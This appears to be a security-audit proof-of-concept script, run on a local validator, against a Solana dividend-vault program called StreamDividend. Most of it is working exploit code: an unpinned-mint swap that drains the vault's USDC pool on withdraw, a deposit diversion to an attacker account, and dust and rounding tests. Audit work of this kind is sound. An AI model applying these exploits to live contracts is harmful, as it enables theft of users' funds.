// SECURITY AUDIT PoC — StreamDividend (local validator, EXACT live binary sha 83e25a99)
// F-1   (HIGH)  withdraw: xstock_mint NOT pinned to vault.xstock_mint; vault_xstock/user_xstock
//               unchecked. Attacker swaps xstock mint -> USDC and drains the vault's USDC
//               dividend pool through the "return xStock" leg, corrupting xStock accounting.
// F-1b  (MED)   deposit: vault_xstock not pinned to the vault PDA's own account; a malicious
//               frontend can divert a user's deposit to an attacker account while inflating vault
//               accounting (vault never actually holds the tokens).
// F-2   (LOW)   dust trigger: per_share/earned truncates -> dust stuck in pool forever (no rescue).
// H-A   (info)  rounding drift: 1:1 first depositor vs pro-rata ratio.
// H-B   (info)  dust-DoS: tiny position, xstock_out truncates to 0 -> ZeroAmount -> position locked.
const { Connection, Keypair, PublicKey, SystemProgram, Transaction } = require("@solana/web3.js");
const { createMint, getAccount, createAssociatedTokenAccount, createAccount, mintTo } = require("@solana/spl-token");
const { AnchorProvider, Wallet, Program, BN } = require("@coral-xyz/anchor");
const fs = require("fs");

const idl = JSON.parse(fs.readFileSync("/root/streamdividend/target/idl/streamdividend.json"));
const PROGRAM = new PublicKey("LuTgK5iC7MvcnWGeJTsXpZH6bHZ4Cf95m333U8ed9kA");
const V3 = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const SYS = SystemProgram.programId;

(async () => {
  const owner = Keypair.generate();
  const conn = new Connection("http://localhost:8899", "confirmed");
  await conn.confirmTransaction(await conn.requestAirdrop(owner.publicKey, 40 * 1e9), "confirmed");
  const P = owner.publicKey;
  const provider = new AnchorProvider(conn, new Wallet(owner), { commitment: "confirmed" });
  const program = new Program(idl, PROGRAM, provider);

  const xMint = await createMint(conn, owner, P, null, 8); // xStock (8 dec)
  const uMint = await createMint(conn, owner, P, null, 6); // "USDC" (6 dec)
  const vaultOf = (auth) => PublicKey.findProgramAddressSync([Buffer.from("vault"), auth.toBytes()], PROGRAM)[0];
  const uState = (v, u) => PublicKey.findProgramAddressSync([Buffer.from("user"), v.toBytes(), u.toBytes()], PROGRAM)[0];
  const progOf = (k) => new Program(idl, PROGRAM, new AnchorProvider(conn, new Wallet(k), { commitment: "confirmed" }));
  const fund = async (k, lam = 5e9) => provider.sendAndConfirm(new Transaction().add(SystemProgram.transfer({ fromPubkey: P, toPubkey: k.publicKey, lamports: lam })));
  const D = (n, d) => new BN(Math.round(n * 10 ** d));
  const bal = async (a) => (await getAccount(conn, a)).amount;
  const ataOff = (mint, ownerKey) => createAssociatedTokenAccount(conn, owner, mint, ownerKey, undefined, undefined, undefined, true);

  // ---- victim vault ----
  const vVault = vaultOf(P);
  const vVaultX = await ataOff(xMint, vVault);
  const vVaultU = await ataOff(uMint, vVault);
  const atOwnerX = await createAssociatedTokenAccount(conn, owner, xMint, P);
  const atOwnerU = await createAssociatedTokenAccount(conn, owner, uMint, P);
  const vAccs = { vault: vVault, xstockMint: xMint, dividendMint: uMint, systemProgram: SYS };
  await program.methods.initialize().accounts(vAccs).rpc();

  const dep = (prog, k, from, amt, vxA = vVaultX) => prog.methods.deposit(amt).accounts({
    ...vAccs, user: k.publicKey, userState: uState(vVault, k.publicKey),
    userXstock: from, vaultXstock: vxA, tokenProgram: V3,
  }).rpc();
  const wd = (prog, k, toX, toU, shares, over = {}) => prog.methods.withdraw(shares).accounts({
    ...vAccs, user: k.publicKey, userState: uState(vVault, k.publicKey),
    userXstock: toX, vaultXstock: vVaultX, userDividend: toU, vaultDividend: vVaultU,
    tokenProgram: V3, usdcTokenProgram: V3, ...over,
  }).rpc();
  const trigger = (amt) => program.methods.triggerDividend(amt).accounts({
    ...vAccs, authority: P, adminDividend: atOwnerU, vaultDividend: vVaultU, tokenProgram: V3,
  }).rpc();
  const claim = (prog, k, toU) => prog.methods.claimDividend().accounts({
    ...vAccs, user: k.publicKey, userState: uState(vVault, k.publicKey), userDividend: toU, vaultDividend: vVaultU, tokenProgram: V3,
  }).rpc();

  // victim deposits 1000 xStock; attacker deposits 1 xStock
  const vic = Keypair.generate(); await fund(vic);
  const atk = Keypair.generate(); await fund(atk);
  const vicX = await createAssociatedTokenAccount(conn, owner, xMint, vic.publicKey);
  const vicU = await createAssociatedTokenAccount(conn, owner, uMint, vic.publicKey);
  const atkX = await createAssociatedTokenAccount(conn, owner, xMint, atk.publicKey);
  const atkU = await createAssociatedTokenAccount(conn, owner, uMint, atk.publicKey);
  const pVic = progOf(vic), pAtk = progOf(atk);

  await mintTo(conn, owner, xMint, vicX, P, D(1000, 8));
  await dep(pVic, vic, vicX, D(1000, 8));
  await mintTo(conn, owner, xMint, atkX, P, D(1, 8));
  await dep(pAtk, atk, atkX, D(1, 8));
  const v0 = await program.account.vault.fetch(vVault);
  console.log(`setup: total_xstock=${v0.totalXstock.toString()} total_shares=${v0.totalShares.toString()}`);

  // fund the USDC dividend pool with 100 USDC (1e8 base)
  await mintTo(conn, owner, uMint, atOwnerU, P, D(100, 6));
  await trigger(D(100, 6));

  // ================= F-1: withdraw mint-swap drain =================
  console.log("\n=== F-1: withdraw xstock-mint-swap -> USDC pool drain ===");
  const poolBn = BigInt((await bal(vVaultU)).toString());
  const atkState = await program.account.userState.fetch(uState(vVault, atk.publicKey));
  const vNow = await program.account.vault.fetch(vVault);
  const dps = BigInt(vNow.dividendsPerShare.toString());
  // leg1 pays the attacker's earned (fair); leg3 pays xstock_out = S*Ts/Tx USDC from the pool.
  const earned = BigInt(atkState.shares.toString()) * dps / 10n ** 12n;
  const S = (poolBn - earned - 10n) * BigInt(vNow.totalShares.toString()) / BigInt(vNow.totalXstock.toString());
  const atkUB = await bal(atkU);
  console.log(`pool ${Number(poolBn) / 1e6} USDC; attacker position ${atkState.shares.toString()} shares (1 xStock); earned=${Number(earned) / 1e6} USDC; swap-withdrawing S=${S.toString()}`);
  try {
    // Swap xstock mint to USDC, source = vault's USDC pool, dest = attacker USDC ATA.
    // vault PDA signs the (fake) xStock-return leg, so USDC moves attacker-side.
    await pAtk.methods.withdraw(new BN(S.toString())).accounts({
      ...vAccs, user: atk.publicKey, userState: uState(vVault, atk.publicKey),
      userXstock: atkU, vaultXstock: vVaultU, userDividend: atkU, vaultDividend: vVaultU,
      xstockMint: uMint, tokenProgram: V3, usdcTokenProgram: V3,
    }).rpc();
    const poolA = await bal(vVaultU), atkUA = await bal(atkU);
    const v1 = await program.account.vault.fetch(vVault);
    console.log(`*** EXPLOIT SUCCEEDED ***  attacker position: ${atkState.shares.toString()} shares (1 xStock deposited)`);
    console.log(`  withdrew ${S.toString()} shares via USDC-mint swap`);
    console.log(`  USDC drained from vault pool: ${Number((poolBn - BigInt(poolA.toString())).toString()) / 1e6} USDC (pool was ${Number(poolBn) / 1e6})`);
    console.log(`  USDC credited to attacker:    ${Number((BigInt(atkUA.toString()) - BigInt(atkUB.toString())).toString()) / 1e6} USDC`);
    console.log(`  vault.total_xstock: ${v0.totalXstock.toString()} -> ${v1.totalXstock.toString()} (corrupted; real xStock untouched)`);
  } catch (e) {
    const msg = String(e.message || e).match(/Error Message: [^"]*/)?.[0] || String(e).slice(0, 200);
    console.log("blocked:", msg);
    (e.transactionLogs || []).slice(-6).forEach(l => console.log("   ", l));
  }
  console.log("\n=== F-1b: deposit -> attacker-controlled vault_xstock ===");
  const h = Keypair.generate(); await fund(h);
  const hX = await createAssociatedTokenAccount(conn, owner, xMint, h.publicKey);
  const pH = progOf(h);
  const atkDivertKp = Keypair.generate();
  const atkDivert = await createAccount(conn, owner, xMint, atk.publicKey, atkDivertKp); // attacker-owned xStock account
  const atkB = await bal(atkDivert);
  await mintTo(conn, owner, xMint, hX, P, D(5, 8));
  try {
    // Malicious frontend: point vaultXstock at the attacker's ATA (still owned by V3, still xMint).
    await dep(pH, h, hX, D(5, 8), atkDivert);
    const atkA = await bal(atkDivert);
    console.log(`*** EXPLOIT SUCCEEDED ***  user h "deposited" 5 xStock but tokens went to attacker:`);
    console.log(`  attacker ATA +${Number(atkA - atkB) / 1e8} xStock; vault accounting inflated (user holds shares, vault holds no tokens)`);
  } catch (e) {
    console.log("blocked:", String(e.message || e).match(/Error Message: [^"]*/)?.[0] || String(e).slice(0, 200));
  }

  // ================= F-2: dust trigger stuck =================
  // per_share = floor(amount*1e12 / total_shares) = 0  <=>  total_shares > amount*1e12.
  // With amount = 1 base unit (min for a 6-dec USDC mint), needs total_shares > 1e12.
  console.log("\n=== F-2: dust trigger (per_share=0) ===");
  const big = Keypair.generate(); await fund(big);
  const bigX = await createAssociatedTokenAccount(conn, owner, xMint, big.publicKey);
  const bigU = await createAssociatedTokenAccount(conn, owner, uMint, big.publicKey);
  const pBig = progOf(big);
  await mintTo(conn, owner, xMint, bigX, P, D(10000, 8)); // push total_shares past 1e12
  await dep(pBig, big, bigX, D(10000, 8));
  const vF2 = await program.account.vault.fetch(vVault);
  console.log(`total_shares now ${vF2.totalShares.toString()} (>1e12 => 1 base USDC => per_share=0)`);
  await claim(pVic, vic, vicU); // victim sweeps accrued FIRST so next claim isolates the dust
  await mintTo(conn, owner, uMint, atOwnerU, P, D(10, 6)); // re-fund admin USDC
  const pB3 = await bal(vVaultU);
  const trigRes = await trigger(new BN(1)).then(() => "TRIGGERED (vuln: 1 base USDC enters pool, per_share=0)").catch(e => "blocked: " + (String(e.message || e).match(/Error Message: [^"]*/)?.[0] || String(e).slice(0, 120)));
  const vicUB3 = await bal(vicU);
  const cr3 = await claim(pVic, vic, vicU).then(() => "claimed").catch(e => String(e.message || e).match(/Error Message: [^"]*/)?.[0] || "err");
  const vicUA3 = await bal(vicU);
  console.log(`dust trigger: ${trigRes}; pool ${Number(pB3)} -> ${Number(await bal(vVaultU))}; claim=${cr3} (+${Number(vicUA3 - vicUB3)} base; 0 => dust stranded forever, no rescue ix)`);

  // ================= H-A: rounding drift =================
  console.log("\n=== H-A: rounding drift (10 xStock round-trip) ===");
  const d2 = Keypair.generate(); await fund(d2);
  const d2X = await createAssociatedTokenAccount(conn, owner, xMint, d2.publicKey);
  const d2U = await createAssociatedTokenAccount(conn, owner, uMint, d2.publicKey);
  const pD2 = progOf(d2);
  await mintTo(conn, owner, xMint, d2X, P, D(10, 8));
  await dep(pD2, d2, d2X, D(10, 8));
  const s2 = (await program.account.userState.fetch(uState(vVault, d2.publicKey))).shares;
  const dB = await bal(d2X);
  await wd(pD2, d2, d2X, d2U, s2);
  const dA = await bal(d2X) - dB;
  console.log(`round-trip 1e9 units -> ${dA.toString()} units (${dA > 10n ** 9n ? "OVERPAID (drift)" : dA < 10n ** 9n ? "underpaid (vault dust)" : "exact"})`);

  // ================= H-B: dust-DoS =================
  console.log("\n=== H-B: dust-DoS (1 base xStock) ===");
  const d3 = Keypair.generate(); await fund(d3);
  const d3X = await createAssociatedTokenAccount(conn, owner, xMint, d3.publicKey);
  const d3U = await createAssociatedTokenAccount(conn, owner, uMint, d3.publicKey);
  const pD3 = progOf(d3);
  await mintTo(conn, owner, xMint, d3X, P, 1n);
  const dp = await dep(pD3, d3, d3X, new BN(1)).then(() => "ok").catch(e => String(e.message || e).match(/Error Message: [^"]*/)?.[0] || "err");
  console.log(`deposit 1 base: ${dp}`);
  if (dp === "ok") {
    const s3 = (await program.account.userState.fetch(uState(vVault, d3.publicKey))).shares;
    const w3 = await wd(pD3, d3, d3X, d3U, s3).then(() => "ok").catch(e => String(e.message || e).match(/Error Message: [^"]*/)?.[0] || "err");
    console.log(`shares=${s3.toString()} full-withdraw: ${w3} (ZeroAmount => dust-DoS: position locked)`);
  }

  console.log("\n=== done ===");
  process.exit(0);
})().catch(e => { console.error("FATAL:", e); process.exit(1); });
